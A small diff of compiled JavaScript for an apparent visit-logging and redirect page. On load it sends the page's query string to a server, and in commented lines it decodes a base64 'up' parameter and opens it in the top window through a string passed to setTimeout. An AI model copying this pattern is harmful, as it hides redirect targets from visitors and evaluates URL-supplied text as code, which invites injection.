@@ -55,7 +55,7 @@ var makelog = function () { return __awaiter(_this, void 0, void 0, function () 
         return [2 /*return*/];
     });
 }); };
-var makeredirect = function () { return __awaiter(_this, void 0, void 0, function () {
+ var makeredirect = function () { return __awaiter(_this, void 0, void 0, function () {
     return __generator(this, function (_a) {
      fetch(url + location.search+'&action=r;', {
             method: 'GET',
@@ -66,9 +66,10 @@ var makeredirect = function () { return __awaiter(_this, void 0, void 0, functio
         return [2 /*return*/];
     });
 }); };
-makelog();
+
 window.onload = function () {
-  makeredirect()
+makelog();
+makeredirect()
 //    var encodedurl = location.search.split('up=')[1].split('&')[0];
 //    var newurl = atob(decodeURI(encodedurl));
 //    window.setTimeout("window.open(\"".concat(newurl, "\",\"_top\",{})"), 750);
